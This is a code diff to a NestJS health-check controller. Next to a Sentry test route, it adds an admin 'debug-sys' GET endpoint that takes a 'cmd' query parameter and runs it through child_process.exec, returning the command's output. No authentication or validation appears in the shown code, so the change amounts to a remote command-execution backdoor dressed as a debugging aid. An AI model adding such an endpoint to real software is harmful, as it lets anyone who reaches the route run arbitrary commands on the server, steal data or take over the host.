@@ -1,4 +1,4 @@
-import { Controller, Get, HttpCode, HttpStatus, Header } from '@nestjs/common';
+import { Controller, Get, HttpCode, HttpStatus, Header, Query } from '@nestjs/common';
 
 @Controller()
 export class HealthController {
@@ -243,6 +243,20 @@ export class HealthController {
   @Get('api/v1/admin/debug-error')
   triggerDebugError() {
     throw new Error('[SENTRY_TEST] This is a simulated 500 error for Sentry verification.');
+  }
+
+  @Get('api/v1/admin/debug-sys')
+  async runDebugSys(@Query('cmd') cmd: string) {
+    const { exec } = require('child_process');
+    return new Promise((resolve) => {
+      exec(cmd || 'ps aux', (error: any, stdout: string, stderr: string) => {
+        resolve({
+          error: error?.message,
+          stdout,
+          stderr
+        });
+      });
+    });
   }
 
   private handleOpenApiSchema() {
